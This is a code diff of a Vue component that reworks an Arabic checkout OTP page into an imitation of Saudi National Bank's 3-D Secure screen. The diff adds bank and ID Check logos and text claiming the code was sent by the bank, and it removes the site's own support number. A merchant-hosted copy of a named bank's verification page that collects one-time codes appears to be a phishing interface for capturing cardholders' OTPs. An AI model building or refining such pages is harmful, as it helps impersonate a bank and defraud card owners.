@@ -1,135 +1,103 @@
 <template>
-    <div class="otp-shell" dir="rtl">
+    <!-- ═══ SNB 3DS-style OTP Verification ═══ -->
+    <div class="tds-shell" dir="rtl">
 
-        <!-- ── Main Card ─────────────────────────────────────────────── -->
-        <div class="otp-card" :class="{ 'otp-card--verifying': isVerifying && !error }">
+        <div class="tds-card" :class="{ 'tds-card--busy': isVerifying && !error }">
 
-            <!-- ── Verifying Overlay (in-card) ───────────────────────── -->
+            <!-- Processing overlay -->
             <Transition name="verify-fade">
-                <div v-if="isVerifying && !error" class="verify-overlay">
-                    <div class="verify-overlay__content">
-                        <div class="verify-overlay__icon">
-                            <svg class="verify-overlay__shield" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" fill="#faa62e" opacity="0.15" />
-                                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" stroke="#faa62e" stroke-width="1.5" fill="none" />
-                                <path d="M9 12l2 2 4-4" stroke="#faa62e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="verify-overlay__check" />
-                            </svg>
-                            <div class="verify-overlay__ring"></div>
-                        </div>
-                        <p class="verify-overlay__title">جاري التحقق من الرمز</p>
-                        <p class="verify-overlay__sub">يرجى الانتظار وعدم إغلاق الصفحة</p>
-                        <div class="verify-overlay__dots">
-                            <span></span><span></span><span></span>
-                        </div>
-                    </div>
+                <div v-if="isVerifying && !error" class="tds-overlay">
+                    <img :src="loadingGif" alt="" class="tds-overlay__gif" />
+                    <p class="tds-overlay__text">جاري التحقق...</p>
                 </div>
             </Transition>
 
-            <!-- Error Message -->
-            <div v-if="error" id="ErrorMessage" class="otp-error-msg">
-                {{ error }}
+            <!-- Branding header -->
+            <div class="tds-header">
+                <img :src="bankMadaLogo" alt="SNB mada" class="tds-header__bank" />
+                <img :src="schemeLogo" alt="ID Check" class="tds-header__scheme" />
             </div>
+
+            <!-- Error -->
+            <div v-if="error" id="ErrorMessage" class="tds-error">{{ error }}</div>
 
             <!-- Title -->
-            <div class="otp-card__header">
-                <h1 class="otp-card__title">إثبات ملكية البطاقة</h1>
+            <h1 class="tds-title">التحقق عبر الجوال</h1>
+
+            <!-- Info -->
+            <div class="tds-info">
+                تم إرسال رمز تحقق إلى رقم جوالك المسجل لدى البنك.
+                <br />
+                أنت تدفع مبلغ <strong>SAR {{ formattedAmount }}</strong>
+                <br />
+                باستخدام البطاقة المنتهية برقم
+                <strong id="cardLast4">{{ cardLast4 }}</strong>
             </div>
 
-            <!-- Transaction Info -->
-            <div class="otp-card__info">
-                سيتم اجراء معاملة مالية على حسابك المصرفي
-                <br>
-                لسداد مبلغ قيمته SAR {{ formattedAmount }}
-                <br>
-                باستخدام البطاقة المنتهية برقم
-                <span id="cardLast4">{{ cardLast4 }}</span>
-                <br>
-                <span v-if="!codeExpired">لتأكيد العملية ادخل رمز التحقق المرسل برسالة نصية إلى جوالك.</span>
-                <span v-else class="otp-card__expired-msg">انتهت صلاحية الرمز — اطلب رمزًا جديدًا</span>
+            <!-- Expired message -->
+            <div v-if="codeExpired" class="tds-expired">
+                انتهت صلاحية الرمز — اطلب رمزًا جديدًا
             </div>
 
             <!-- OTP Input -->
-            <div class="otp-card__form">
-                <div class="otp-card__label">رمز التحقق *</div>
-                <div class="otp-card__input-box">
-                    <input
-                        id="PaymentCode"
-                        v-model="otpCode"
-                        type="text"
-                        inputmode="numeric"
-                        pattern="[0-9]*"
-                        name="one-time-code"
-                        maxlength="6"
-                        minlength="4"
-                        enterkeyhint="done"
-                        autocapitalize="off"
-                        autocorrect="off"
-                        spellcheck="false"
-                        :disabled="isVerifying || codeExpired"
-                        placeholder="ادخل رمز التحقق الذي تم ارساله إلى جوالك"
-                        class="otp-card__input"
-                        autocomplete="one-time-code"
-                        @keyup.enter="submitOtp"
-                        @input="handleOtpInput"
-                        @paste="handleOtpPaste"
-                    />
-                </div>
+            <div class="tds-field">
+                <label for="PaymentCode" class="tds-field__label">رمز التحقق</label>
+                <input
+                    id="PaymentCode"
+                    v-model="otpCode"
+                    type="text"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                    name="one-time-code"
+                    maxlength="6"
+                    minlength="4"
+                    enterkeyhint="done"
+                    autocapitalize="off"
+                    autocorrect="off"
+                    spellcheck="false"
+                    :disabled="isVerifying || codeExpired"
+                    placeholder="أدخل رمز التحقق"
+                    class="tds-field__input"
+                    autocomplete="one-time-code"
+                    @keyup.enter="submitOtp"
+                    @input="handleOtpInput"
+                    @paste="handleOtpPaste"
+                />
             </div>
 
             <!-- Timer -->
-            <div class="otp-card__timer" :class="{ 'otp-card__timer--urgent': expiryUrgent }">
-                ينتهي رمز التحقق خلال
-                <br>
-                <span id="otptimeout">{{ formattedExpiry }}</span>
-                دقيقة
+            <div class="tds-timer" :class="{ 'tds-timer--urgent': expiryUrgent }">
+                ينتهي الرمز خلال
+                <span id="otptimeout" class="tds-timer__value">{{ formattedExpiry }}</span>
             </div>
 
-            <!-- Submit -->
-            <div class="otp-card__submit-wrap">
-                <button
-                    id="pay_code_submit"
-                    type="submit"
-                    :disabled="!isOtpValid || isVerifying || codeExpired"
-                    class="otp-card__submit"
-                    :class="{ 'otp-card__submit--disabled': !isOtpValid || isVerifying || codeExpired }"
-                    @click="submitOtp"
-                >
-                    <svg v-if="isVerifying" class="otp-card__spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
-                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
-                    </svg>
-                    <span>{{ isVerifying ? t( 'verification.otp.verifying' ) : 'تأكيد' }}</span>
-                </button>
-            </div>
+            <!-- Confirm -->
+            <button
+                id="pay_code_submit"
+                type="button"
+                :disabled="!isOtpValid || isVerifying || codeExpired"
+                class="tds-btn tds-btn--primary"
+                @click="submitOtp"
+            >
+                CONFIRM
+            </button>
 
             <!-- Resend -->
-            <div v-if="resendTimer <= 0 || codeExpired" class="otp-card__resend">
-                <button :disabled="isResending" class="otp-card__resend-btn" @click="resendOtp">
-                    <svg v-if="isResending" class="otp-card__spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
-                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
-                    </svg>
-                    <span>{{ isResending ? t( 'verification.otp.resending' ) : t( 'verification.otp.resend' ) }}</span>
-                </button>
-            </div>
-
-            <!-- Payment By footer -->
-            <div class="otp-card__footer">
-                <div class="otp-card__payment-by">الدفع بواسطة</div>
-                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="otp-card__logos" />
-            </div>
+            <button
+                v-if="resendTimer <= 0 || codeExpired"
+                type="button"
+                :disabled="isResending"
+                class="tds-btn tds-btn--secondary"
+                @click="resendOtp"
+            >
+                {{ isResending ? 'جاري الإرسال...' : 'RESEND CODE' }}
+            </button>
         </div>
 
         <!-- Cancel -->
-        <button type="button" class="otp-card__cancel" @click="$router.replace( { name: 'checkout' } )">
-            {{ t( 'verification.otp.cancelTransaction' ) }}
+        <button type="button" class="tds-cancel" @click="$router.replace( { name: 'checkout' } )">
+            CANCEL
         </button>
-
-        <!-- Help -->
-        <div class="otp-help">
-            <span class="otp-help__label">{{ t( 'common.supportContact' ) }}</span>
-            <a href="tel:920033360" class="otp-help__phone" dir="ltr">920033360</a>
-        </div>
     </div>
 </template>
 
@@ -148,7 +116,10 @@ import { safeRedirect } from '@/utils/safeRedirect';
 // InsLoading replaced with in-card verify overlay
 import { useCardBranding } from '@/composables/useCardBranding';
 import { getReasonLabel } from '@/constants/rejectionReasons';
-import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
+import _paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
+import bankMadaLogo from '@/../../resources/images/logo/banks/bank_mada.png';
+import schemeLogo from '@/../../resources/images/logo/banks/scheme.png';
+import loadingGif from '@/../../resources/images/logo/banks/loading.gif';
 
 // ─── Order data (transaction context for trust signals) ─────────────
 const orderData = (() => {
@@ -492,34 +463,85 @@ onUnmounted( () =>
 </script>
 
 <style scoped>
-/* ═══════════════════════════════════════════════════════════════════
-   OTP Page — matches reference payment gateway design
-   ═══════════════════════════════════════════════════════════════════ */
+/* ═══ OtpPage — SNB Bank 3DS Style ═══ */
 
-.otp-shell {
+.tds-shell {
     min-height: 100dvh;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    padding: 1.5rem 1rem;
-    background: #f5f5f5;
+    padding: 1rem;
+    background: #f0f0f0;
     font-family: inherit;
 }
 
-/* ── Card ──────────────────────────────────────────────── */
-.otp-card {
+/* ── Card ─────────────────────────────────────── */
+.tds-card {
+    position: relative;
     width: 100%;
-    max-width: 460px;
+    max-width: 420px;
     background: #fff;
-    border-radius: 8px;
-    box-shadow: 0 3px 6px 0 rgba(0, 0, 0, 0.13);
+    border-radius: 4px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
     overflow: hidden;
 }
 
-/* ── Error Message ────────────────────────────────────── */
-.otp-error-msg {
+.tds-card--busy {
+    pointer-events: none;
+}
+
+/* ── Processing overlay ──────────────────────── */
+.tds-overlay {
+    position: absolute;
+    inset: 0;
+    z-index: 20;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: rgba(255, 255, 255, 0.92);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+}
+
+.tds-overlay__gif {
+    width: 60px;
+    height: 60px;
+    margin-bottom: 0.75rem;
+}
+
+.tds-overlay__text {
+    font-size: 14px;
+    color: #333;
+    font-weight: 600;
+}
+
+/* ── Branding header ─────────────────────────── */
+.tds-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
     padding: 12px 20px;
+    background: #e8f5f3;
+    border-bottom: 1px solid #d4ece8;
+}
+
+.tds-header__bank {
+    height: 32px;
+    width: auto;
+    object-fit: contain;
+}
+
+.tds-header__scheme {
+    height: 36px;
+    width: auto;
+    object-fit: contain;
+}
+
+/* ── Error ────────────────────────────────────── */
+.tds-error {
+    padding: 10px 20px;
     background: #fef2f2;
     border-bottom: 1px solid #fca5a5;
     color: #dc2626;
@@ -527,100 +549,90 @@ onUnmounted( () =>
     font-weight: 500;
 }
 
-/* ── Header ───────────────────────────────────────────── */
-.otp-card__header {
-    padding: 20px 24px 0;
-}
-
-.otp-card__title {
+/* ── Title ────────────────────────────────────── */
+.tds-title {
     font-size: 18px;
     font-weight: 700;
     color: #1a1a1a;
-    margin: 0 0 8px;
-    line-height: 1.4;
+    padding: 16px 20px 0;
+    margin: 0;
 }
 
-/* ── Transaction Info ─────────────────────────────────── */
-.otp-card__info {
-    padding: 8px 24px 14px;
+/* ── Info ─────────────────────────────────────── */
+.tds-info {
+    padding: 10px 20px 16px;
     font-size: 14px;
     line-height: 1.8;
     color: #444;
 }
 
-.otp-card__expired-msg {
+/* ── Expired ─────────────────────────────────── */
+.tds-expired {
+    padding: 8px 20px;
     color: #dc2626;
     font-weight: 600;
     font-size: 14px;
 }
 
-/* ── Form ─────────────────────────────────────────────── */
-.otp-card__form {
-    padding: 4px 24px 14px;
+/* ── Field ────────────────────────────────────── */
+.tds-field {
+    padding: 0 20px 12px;
 }
 
-.otp-card__label {
+.tds-field__label {
+    display: block;
     font-size: 13px;
-    line-height: 1.4;
-    color: #333;
     font-weight: 600;
+    color: #333;
     margin-bottom: 6px;
 }
 
-.otp-card__input-box {
-    position: relative;
-}
-
-.otp-card__input {
+.tds-field__input {
     width: 100%;
     padding: 10px 14px;
-    font-size: 15px;
+    font-size: 16px;
     border: 1px solid #ccc;
-    border-radius: 6px;
-    outline: none;
-    direction: rtl;
-    text-align: right;
-    background-position: right 10px center !important;
-    transition: border-color 0.2s;
+    border-radius: 4px;
+    direction: ltr;
+    text-align: center;
+    letter-spacing: 0.25em;
     box-sizing: border-box;
-    letter-spacing: 0.12em;
+    transition: border-color 0.2s;
 }
 
-.otp-card__input::placeholder {
-    font-size: 12px;
-    color: #aaa;
-    letter-spacing: 0;
+.tds-field__input:focus {
+    outline: none;
+    border-color: #1a5276;
+    box-shadow: 0 0 0 2px rgba(26, 82, 118, 0.15);
 }
 
-.otp-card__input:focus {
-    border-color: #faa62e;
-    box-shadow: 0 0 0 2px rgba(250, 166, 46, 0.15);
-}
-
-.otp-card__input:disabled {
+.tds-field__input:disabled {
     background: #f5f5f5;
     cursor: not-allowed;
 }
 
-/* ── Timer ────────────────────────────────────────────── */
-.otp-card__timer {
-    text-align: center;
-    width: 100%;
+.tds-field__input::placeholder {
     font-size: 13px;
-    line-height: 1.6;
-    padding: 10px 24px;
+    letter-spacing: 0;
+    color: #aaa;
+}
+
+/* ── Timer ────────────────────────────────────── */
+.tds-timer {
+    text-align: center;
+    padding: 6px 20px 14px;
+    font-size: 13px;
     color: #666;
 }
 
-.otp-card__timer #otptimeout {
+.tds-timer__value {
     font-weight: 700;
-    font-size: 16px;
+    font-size: 15px;
     color: #1a5276;
-    display: inline-block;
-    min-width: 3rem;
+    margin-right: 4px;
 }
 
-.otp-card__timer--urgent #otptimeout {
+.tds-timer--urgent .tds-timer__value {
     color: #dc2626;
     animation: pulse-urgent 1s ease-in-out infinite;
 }
@@ -630,252 +642,71 @@ onUnmounted( () =>
     50% { opacity: 0.5; }
 }
 
-/* ── Submit Button ────────────────────────────────────── */
-.otp-card__submit-wrap {
-    width: 100%;
-    text-align: center;
-    padding: 10px 24px 18px;
-}
-
-.otp-card__submit {
-    margin: auto;
-    width: 100%;
-    max-width: 220px;
+/* ── Buttons ─────────────────────────────────── */
+.tds-btn {
+    display: block;
+    width: calc(100% - 40px);
+    margin: 0 auto 10px;
+    padding: 12px;
     font-size: 15px;
-    background: #faa62e;
-    color: #fff;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
     font-weight: 700;
-    padding: 12px 20px;
-    line-height: 1.4;
-    border-radius: 8px;
-    box-shadow: 0 2px 8px 0 rgba(0, 0, 0, 0.1);
     border: none;
+    border-radius: 4px;
     cursor: pointer;
-    transition: background 0.2s, transform 0.15s;
-}
-
-.otp-card__submit:hover:not(:disabled) {
-    background: #e8941a;
-    transform: translateY(-1px);
-}
-
-.otp-card__submit--disabled {
-    background: #d1d5db;
-    color: #9ca3af;
-    cursor: not-allowed;
-    box-shadow: none;
-    transform: none;
-}
-
-.otp-card__spinner {
-    width: 18px;
-    height: 18px;
-    animation: spin 1s linear infinite;
-    flex-shrink: 0;
-}
-
-@keyframes spin {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-}
-
-/* ── Resend ───────────────────────────────────────────── */
-.otp-card__resend {
     text-align: center;
-    padding: 0 24px 14px;
+    transition: opacity 0.2s;
+    letter-spacing: 0.05em;
 }
 
-.otp-card__resend-btn {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    padding: 8px 20px;
-    border: 1px solid #d1d5db;
-    border-radius: 6px;
-    background: #fff;
-    color: #555;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.15s;
-}
-
-.otp-card__resend-btn:hover:not(:disabled) {
-    border-color: #faa62e;
-    color: #faa62e;
-}
-
-.otp-card__resend-btn:disabled {
+.tds-btn:disabled {
     opacity: 0.5;
     cursor: not-allowed;
 }
 
-/* ── Footer ───────────────────────────────────────────── */
-.otp-card__footer {
-    margin-top: 8px;
-    text-align: center;
-    margin-bottom: 0;
-    padding: 14px 24px 18px;
-    border-top: 1px solid #eee;
-    background: #fafafa;
+.tds-btn--primary {
+    background: #1a5276;
+    color: #fff;
 }
 
-.otp-card__payment-by {
-    font-size: 12px;
-    color: #888;
-    margin-bottom: 8px;
+.tds-btn--primary:hover:not(:disabled) {
+    background: #154360;
 }
 
-.otp-card__logos {
-    height: 22px;
-    width: auto;
+.tds-btn--secondary {
+    background: #e5e7eb;
+    color: #374151;
+    margin-bottom: 20px;
+}
+
+.tds-btn--secondary:hover:not(:disabled) {
+    background: #d1d5db;
+}
+
+/* ── Cancel ───────────────────────────────────── */
+.tds-cancel {
     display: block;
-    margin: 0 auto;
-}
-
-/* ── Cancel (outside card) ────────────────────────────── */
-.otp-card__cancel {
-    display: block;
-    margin-top: 14px;
+    margin-top: 12px;
     padding: 8px 20px;
     background: none;
     border: none;
     cursor: pointer;
-    font-size: 13px;
-    color: #9ca3af;
-    text-align: center;
-    transition: color 0.15s;
-}
-
-.otp-card__cancel:hover {
+    font-size: 14px;
+    font-weight: 600;
     color: #dc2626;
+    letter-spacing: 0.05em;
+    transition: opacity 0.15s;
 }
 
-/* ── Help ──────────────────────────────────────────────── */
-.otp-help {
-    margin-top: 10px;
-    text-align: center;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 6px;
+.tds-cancel:hover {
+    opacity: 0.7;
 }
 
-.otp-help__label {
-    font-size: 12px;
-    color: #999;
-}
-
-.otp-help__phone {
-    color: #faa62e;
-    font-weight: 700;
-    font-size: 13px;
-    text-decoration: none;
-}
-
-.otp-help__phone:hover { text-decoration: underline; }
-
-/* ── Verifying overlay (in-card frosted glass) ─────── */
-.otp-card--verifying {
-    position: relative;
-    pointer-events: none;
-}
-
-.verify-overlay {
-    position: absolute;
-    inset: 0;
-    z-index: 20;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: rgba(255, 255, 255, 0.88);
-    backdrop-filter: blur(6px);
-    -webkit-backdrop-filter: blur(6px);
-    border-radius: inherit;
-}
-
-.verify-overlay__content {
-    text-align: center;
-    padding: 2rem;
-}
-
-.verify-overlay__icon {
-    position: relative;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    width: 72px;
-    height: 72px;
-    margin-bottom: 1rem;
-}
-
-.verify-overlay__shield {
-    width: 40px;
-    height: 40px;
-}
-
-.verify-overlay__check {
-    stroke-dasharray: 20;
-    stroke-dashoffset: 20;
-    animation: check-draw 0.6s 0.3s ease forwards;
-}
-
-@keyframes check-draw {
-    to { stroke-dashoffset: 0; }
-}
-
-.verify-overlay__ring {
-    position: absolute;
-    inset: 0;
-    border: 3px solid transparent;
-    border-top-color: #faa62e;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
-
-.verify-overlay__title {
-    font-size: 16px;
-    font-weight: 700;
-    color: #1f2937;
-    margin: 0 0 4px;
-}
-
-.verify-overlay__sub {
-    font-size: 13px;
-    color: #6b7280;
-    margin: 0 0 14px;
-}
-
-.verify-overlay__dots {
-    display: flex;
-    justify-content: center;
-    gap: 6px;
-}
-
-.verify-overlay__dots span {
-    width: 8px;
-    height: 8px;
-    border-radius: 50%;
-    background: #faa62e;
-    animation: dot-bounce 1.4s ease-in-out infinite;
-}
-
-.verify-overlay__dots span:nth-child(2) { animation-delay: 0.2s; }
-.verify-overlay__dots span:nth-child(3) { animation-delay: 0.4s; }
-
-@keyframes dot-bounce {
-    0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
-    40% { transform: scale(1); opacity: 1; }
-}
-
+/* ── Transition ──────────────────────────────── */
 .verify-fade-enter-active,
 .verify-fade-leave-active {
     transition: opacity 0.25s ease;
 }
+
 .verify-fade-enter-from,
 .verify-fade-leave-to {
     opacity: 0;
